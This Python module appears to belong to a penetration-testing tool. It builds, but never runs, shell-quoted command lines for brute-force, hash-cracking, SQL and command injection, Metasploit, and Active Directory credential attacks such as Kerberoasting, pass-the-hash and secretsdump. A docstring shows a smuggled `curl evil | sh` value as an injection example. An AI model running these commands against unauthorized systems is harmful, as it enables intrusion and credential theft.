"""Command builder for the aggressive tools (brute force / exploit / DoS-capable).

This module never runs anything. It has no dependency on common.run_tool or
subprocess — that's structural, not just a convention, so there's no code
path here that could ever execute a command. It only assembles a string for
Cole to read, review, and paste into his own terminal.

Every field value is passed through shlex.quote before being placed in the
string. That's not for our safety (nothing here executes) — it's so a
malicious or malformed field can't turn into a second shell command when
Cole pastes the output into a real terminal (e.g. a wordlist "path" of
`x; curl evil | sh` renders as a single quoted, inert argument).
"""

from __future__ import annotations

import shlex

MAX_FIELD_LEN = 2048


def _clean(v) -> str:
    s = "" if v is None else str(v)
    s = s.replace("\n", " ").replace("\r", " ").strip()
    return s[:MAX_FIELD_LEN]


def _q(v) -> str:
    return shlex.quote(_clean(v))


def _cmd(parts: list[str]) -> str:
    return " ".join(p for p in parts if p)


# --------------------------------------------------------------------------
# Each builder: (params dict) -> assembled command string. `required` lists
# the keys that must be non-empty for the template to make sense; missing
# ones are left as a <PLACEHOLDER> in the output rather than failing, so
# Cole can see the shape of the command even with a partial form.
# --------------------------------------------------------------------------
def _ph(params: dict, key: str, label: str) -> str:
    v = params.get(key)
    if v is None or _clean(v) == "":
        return f"<{label}>"
    return _q(v)


def _build_hydra(p: dict) -> str:
    login_flag = "-L" if p.get("login_is_file") else "-l"
    pass_flag = "-P" if p.get("pass_is_file") else "-p"
    tasks = _clean(p.get("tasks")) or "4"
    parts = [
        "hydra",
        login_flag, _ph(p, "login", "USERNAME_OR_USERFILE"),
        pass_flag, _ph(p, "password", "PASSWORD_OR_PASSFILE"),
        "-t", shlex.quote(tasks),
        _ph(p, "target", "TARGET"),
        _ph(p, "service", "SERVICE"),
    ]
    return _cmd(parts)


def _build_hashcat(p: dict) -> str:
    mode = _clean(p.get("mode")) or "<HASH_MODE>"
    attack = _clean(p.get("attack")) or "0"
    parts = [
        "hashcat", "-m", shlex.quote(mode), "-a", shlex.quote(attack),
        _ph(p, "hash_file", "HASH_FILE"),
        _ph(p, "wordlist_or_mask", "WORDLIST_OR_MASK"),
    ]
    return _cmd(parts)


def _build_sqlmap(p: dict) -> str:
    parts = ["sqlmap", "-u", _ph(p, "url", "URL")]
    if _clean(p.get("data")):
        parts += ["--data", _q(p["data"])]
    if _clean(p.get("cookie")):
        parts += ["--cookie", _q(p["cookie"])]
    parts += ["--level", shlex.quote(_clean(p.get("level")) or "1")]
    parts += ["--risk", shlex.quote(_clean(p.get("risk")) or "1")]
    parts.append("--batch")
    return _cmd(parts)


def _build_metasploit(p: dict) -> str:
    module = _clean(p.get("module")) or "<MODULE e.g. exploit/windows/smb/ms17_010_eternalblue>"
    lines = [f"use {module}"]
    if _clean(p.get("rhosts")):
        lines.append(f"set RHOSTS {_clean(p['rhosts'])}")
    if _clean(p.get("rport")):
        lines.append(f"set RPORT {_clean(p['rport'])}")
    if _clean(p.get("payload")):
        lines.append(f"set PAYLOAD {_clean(p['payload'])}")
    if _clean(p.get("lhost")):
        lines.append(f"set LHOST {_clean(p['lhost'])}")
    lines.append("run")
    resource = "; ".join(lines)
    return _cmd(["msfconsole", "-q", "-x", shlex.quote(resource)])


def _build_medusa(p: dict) -> str:
    user_flag = "-U" if p.get("login_is_file") else "-u"
    pass_flag = "-P" if p.get("pass_is_file") else "-p"
    tasks = _clean(p.get("tasks")) or "4"
    parts = [
        "medusa", "-h", _ph(p, "target", "TARGET"),
        user_flag, _ph(p, "login", "USERNAME_OR_USERFILE"),
        pass_flag, _ph(p, "password", "PASSWORD_OR_PASSFILE"),
        "-M", _ph(p, "service", "MODULE"),
        "-t", shlex.quote(tasks),
    ]
    return _cmd(parts)


def _build_john(p: dict) -> str:
    parts = ["john"]
    if _clean(p.get("format")):
        parts.append(f"--format={_clean(p['format'])}")
    if _clean(p.get("wordlist")):
        parts.append(f"--wordlist={_q(p['wordlist'])}")
    parts.append(_ph(p, "hash_file", "HASH_FILE"))
    return _cmd(parts)


def _build_ffuf(p: dict) -> str:
    parts = ["ffuf", "-u", _ph(p, "url", "URL_WITH_FUZZ_KEYWORD")]
    parts += ["-w", _ph(p, "wordlist", "WORDLIST")]
    if _clean(p.get("filter_code")):
        parts += ["-fc", shlex.quote(_clean(p["filter_code"]))]
    parts += ["-t", shlex.quote(_clean(p.get("threads")) or "40")]
    return _cmd(parts)


def _build_gobuster(p: dict) -> str:
    mode = _clean(p.get("mode")) or "dir"
    parts = ["gobuster", shlex.quote(mode), "-u", _ph(p, "target", "URL_OR_DOMAIN")]
    parts += ["-w", _ph(p, "wordlist", "WORDLIST")]
    if mode == "dir" and _clean(p.get("extensions")):
        parts += ["-x", shlex.quote(_clean(p["extensions"]))]
    parts += ["-t", shlex.quote(_clean(p.get("threads")) or "10")]
    return _cmd(parts)


def _build_wpscan(p: dict) -> str:
    parts = ["wpscan", "--url", _ph(p, "url", "URL")]
    parts += ["--enumerate", shlex.quote(_clean(p.get("enumerate")) or "vp,vt,u")]
    if _clean(p.get("api_token")):
        parts += ["--api-token", _q(p["api_token"])]
    parts.append("--random-user-agent")
    return _cmd(parts)


def _build_commix(p: dict) -> str:
    parts = ["commix", f"--url={_ph(p, 'url', 'URL')}"]
    if _clean(p.get("data")):
        parts.append(f"--data={_q(p['data'])}")
    if _clean(p.get("cookie")):
        parts.append(f"--cookie={_q(p['cookie'])}")
    parts.append(f"--level={shlex.quote(_clean(p.get('level')) or '1')}")
    parts.append("--batch")
    return _cmd(parts)


def _build_amass(p: dict) -> str:
    parts = ["amass", "enum", "-d", _ph(p, "domain", "DOMAIN")]
    if p.get("active_flag"):
        parts.append("-active")
    if p.get("brute_flag"):
        parts.append("-brute")
    parts += ["-timeout", shlex.quote(_clean(p.get("timeout")) or "30")]
    return _cmd(parts)


# --------------------------------------------------------------------------
# AD / internal builders. Same rule as everything above: assemble a string,
# execute nothing. These are the authenticated post-foothold tools a real
# internal pentest reaches for — noisy and often logged, which is exactly why
# they belong here (a copy-paste command the operator runs) and never on a
# web button. A hash beats a password wherever both are offered (pass-the-hash).
# --------------------------------------------------------------------------
def _impacket_creds(p: dict) -> str:
    """`DOMAIN/user:password` (or `DOMAIN/user` when a hash is supplied and
    auth rides -hashes instead), as one shlex-quoted, inert argument."""
    domain = _clean(p.get("domain")) or "<DOMAIN>"
    user = _clean(p.get("login")) or "<USERNAME>"
    if _clean(p.get("hash")):
        return _q(f"{domain}/{user}")
    pw = _clean(p.get("password")) or "<PASSWORD>"
    return _q(f"{domain}/{user}:{pw}")


def _impacket_hashes(p: dict) -> list[str]:
    h = _clean(p.get("hash"))
    return ["-hashes", _q(h)] if h else []


def _build_netexec(p: dict) -> str:
    proto = _clean(p.get("protocol")) or "smb"
    if proto not in ("smb", "winrm", "ldap", "mssql", "ssh", "ftp", "rdp", "wmi"):
        proto = "smb"
    parts = ["nxc", shlex.quote(proto), _ph(p, "target", "TARGET"),
             "-u", _ph(p, "login", "USERNAME")]
    if _clean(p.get("hash")):
        parts += ["-H", _q(p["hash"])]
    else:
        parts += ["-p", _ph(p, "password", "PASSWORD_OR_use_hash")]
    if _clean(p.get("domain")):
        parts += ["-d", _q(p["domain"])]
    action = _clean(p.get("action"))
    if action == "shares":
        parts.append("--shares")
    elif action == "users":
        parts.append("--users")
    elif action == "spider":
        parts += ["-M", "spider_plus"]
    return _cmd(parts)


def _build_getuserspns(p: dict) -> str:
    parts = ["GetUserSPNs.py", _impacket_creds(p)] + _impacket_hashes(p)
    if _clean(p.get("dc_ip")):
        parts += ["-dc-ip", _q(p["dc_ip"])]
    parts += ["-request", "-outputfile", "kerberoast.hashes"]
    return _cmd(parts)


def _build_getnpusers(p: dict) -> str:
    domain = _clean(p.get("domain")) or "<DOMAIN>"
    if _clean(p.get("login")):
        # Known credentials: enumerate the domain's AS-REP-roastable users.
        parts = ["GetNPUsers.py", _impacket_creds(p)] + _impacket_hashes(p)
    else:
        # No creds: spray a username list with -no-pass (the classic AS-REP roast).
        parts = ["GetNPUsers.py", _q(f"{domain}/"),
                 "-usersfile", _ph(p, "userfile", "USERS_FILE"), "-no-pass"]
    if _clean(p.get("dc_ip")):
        parts += ["-dc-ip", _q(p["dc_ip"])]
    parts += ["-request", "-format", "hashcat"]
    return _cmd(parts)


def _build_secretsdump(p: dict) -> str:
    domain = _clean(p.get("domain")) or "<DOMAIN>"
    user = _clean(p.get("login")) or "<USERNAME>"
    host = _clean(p.get("target")) or "<TARGET_HOST>"
    if _clean(p.get("hash")):
        parts = ["secretsdump.py", _q(f"{domain}/{user}@{host}")] + _impacket_hashes(p)
    else:
        pw = _clean(p.get("password")) or "<PASSWORD>"
        parts = ["secretsdump.py", _q(f"{domain}/{user}:{pw}@{host}")]
    if _clean(p.get("dc_ip")):
        parts += ["-dc-ip", _q(p["dc_ip"])]
    return _cmd(parts)


def _build_smbmap(p: dict) -> str:
    parts = ["smbmap", "-H", _ph(p, "target", "TARGET")]
    if _clean(p.get("login")):
        parts += ["-u", _q(p["login"])]
    if _clean(p.get("hash")):
        parts += ["-p", _q(p["hash"])]   # smbmap takes LM:NT in -p for pass-the-hash
    elif _clean(p.get("password")):
        parts += ["-p", _q(p["password"])]
    if _clean(p.get("domain")):
        parts += ["-d", _q(p["domain"])]
    return _cmd(parts)


def _build_evilwinrm(p: dict) -> str:
    parts = ["evil-winrm", "-i", _ph(p, "target", "TARGET"),
             "-u", _ph(p, "login", "USERNAME")]
    if _clean(p.get("hash")):
        parts += ["-H", _q(p["hash"])]
    else:
        parts += ["-p", _ph(p, "password", "PASSWORD")]
    return _cmd(parts)


BUILDERS = {
    "hydra": {"build": _build_hydra, "desc": "Online login brute-force (many protocols).",
              "fields": ["target", "service", "login", "login_is_file", "password", "pass_is_file", "tasks"],
              "note": "Credential attacks aren't a web-button action — you run this yourself."},
    "hashcat": {"build": _build_hashcat, "desc": "Offline hash cracking.",
                "fields": ["hash_file", "mode", "attack", "wordlist_or_mask"],
                "note": "Offline cracking, long-running, GPU-bound — run it yourself."},
    "sqlmap": {"build": _build_sqlmap, "desc": "SQL injection testing, including enumeration/dump (full power — "
               "for detection-only, use the Run tab's sqlmap instead).",
               "fields": ["url", "data", "cookie", "level", "risk"],
               "note": "The Run tab only ever does safe detection (level=1, risk=1, no dump/shell). "
               "Anything past that — higher level/risk, --dump, --os-shell — is here so you run it yourself."},
    "metasploit": {"build": _build_metasploit, "desc": "Exploit module resource script (msfconsole -x).",
                   "fields": ["module", "rhosts", "rport", "payload", "lhost"],
                   "note": "Exploitation, not scanning — always run this yourself."},
    "medusa": {"build": _build_medusa, "desc": "Parallel online login brute-force.",
               "fields": ["target", "service", "login", "login_is_file", "password", "pass_is_file", "tasks"],
               "note": "Credential attacks aren't a web-button action — you run this yourself."},
    "john": {"build": _build_john, "desc": "Offline password hash cracking.",
             "fields": ["hash_file", "format", "wordlist"],
             "note": "Offline cracking, long-running — run it yourself."},
    "ffuf": {"build": _build_ffuf, "desc": "Fast web fuzzing / directory brute-force — arbitrary wordlist path, "
             "any extensions/threads (the Run tab's ffuf is wordlist-registry-gated; this one isn't).",
             "fields": ["url", "wordlist", "filter_code", "threads"]},
    "gobuster": {"build": _build_gobuster, "desc": "Directory / DNS / vhost brute-force — arbitrary wordlist path "
                 "(the Run tab's gobuster is wordlist-registry-gated; this one isn't).",
                 "fields": ["mode", "target", "wordlist", "extensions", "threads"]},
    "wpscan": {"build": _build_wpscan, "desc": "WordPress vuln + enumeration scan with a raw API token field "
               "(the Run tab's wpscan reads the token from var/.env instead of a form field).",
               "fields": ["url", "enumerate", "api_token"]},
    "commix": {"build": _build_commix, "desc": "Automated command-injection exploitation.",
               "fields": ["url", "data", "cookie", "level"],
               "note": "Exploitation, not scanning — always run this yourself."},
    "amass": {"build": _build_amass, "desc": "Subdomain enum — passive by default, -active attempts zone "
              "transfers/cert grabs, -brute runs a wordlist brute after searches.",
              "fields": ["domain", "active_flag", "brute_flag", "timeout"],
              "note": "Not run from here on purpose: `amass enum` starts a local 'engine' daemon that binds "
              "0.0.0.0:4000 with no authentication (confirmed live on this box) and can outlive the command "
              "that started it. Run it yourself so you control when that's up — check "
              "`pgrep -af 'amass engine'` after and `pkill -f 'amass engine'` if you don't need it anymore."},

    # ---- AD / internal (post-foothold, authenticated, noisy) ----
    "netexec": {"build": _build_netexec, "desc": "netexec/nxc — authenticated sweep of a host or range over "
                "smb/winrm/ldap/etc. Pick an action: --shares, --users, or spider (spider_plus module).",
                "fields": ["protocol", "target", "login", "password", "hash", "domain", "action"],
                "note": "Authenticated and LOUD — hits every host in the range and lands in Windows event logs. "
                "Supply a password or an NT/LM hash (-H, pass-the-hash). Run it yourself."},
    "getuserspns": {"build": _build_getuserspns, "desc": "impacket GetUserSPNs — Kerberoast: request TGS tickets "
                    "for SPN-bearing accounts to crack offline.",
                    "fields": ["domain", "login", "password", "hash", "dc_ip"],
                    "note": "Authenticated (any domain user). -request pulls crackable tickets and is logged by the "
                    "DC (event 4769). Feed the output to hashcat -m 13100. Run it yourself."},
    "getnpusers": {"build": _build_getnpusers, "desc": "impacket GetNPUsers — AS-REP roast: pull hashes for "
                   "accounts with Kerberos pre-auth disabled. Works with creds or a username list + -no-pass.",
                   "fields": ["domain", "login", "password", "hash", "userfile", "dc_ip"],
                   "note": "The no-creds (username-list) form is a pre-auth guess and shows up as failed logons on "
                   "the DC. Crack results with hashcat -m 18200. Run it yourself."},
    "secretsdump": {"build": _build_secretsdump, "desc": "impacket secretsdump — dump SAM/LSA/NTDS secrets "
                    "(local hashes, or full domain hashes against a DC).",
                    "fields": ["domain", "login", "password", "hash", "target", "dc_ip"],
                    "note": "Highly privileged and highly logged — needs local admin (or DC access for DCSync). "
                    "This is credential theft; only against systems you're authorized to test. Run it yourself."},
    "smbmap": {"build": _build_smbmap, "desc": "smbmap — enumerate SMB shares and your access level on them "
               "(read-only listing; no -x exec, no download built here).",
               "fields": ["target", "login", "password", "hash", "domain"],
               "note": "Authenticated share enumeration — quieter than the tools above but still a real logon. "
               "Run it yourself."},
    "evilwinrm": {"build": _build_evilwinrm, "desc": "evil-winrm — interactive WinRM (PowerShell) shell on a host, "
                  "by password or NT hash (-H).",
                  "fields": ["target", "login", "password", "hash"],
                  "note": "This is an interactive shell, not a scan — needs WinRM (5985/5986) and a Remote "
                  "Management user. Run it yourself."},
}


def handle_build(req) -> "common.Response":
    from shared import common  # local import: keep this module import-clean of exec-capable code
    body = req.json()
    tool = str(body.get("tool") or "")
    params = body.get("params") or {}
    if not isinstance(params, dict):
        params = {}

    entry = BUILDERS.get(tool)
    if entry is None:
        return common.Response.error(400,
            f"'{tool}' has no command builder. Known: {', '.join(sorted(BUILDERS))}")

    command = entry["build"](params)
    return common.Response.json({
        "tool": tool,
        "command": command,
        "note": "This command is NOT executed. Copy it and run it yourself in a terminal.",
    })
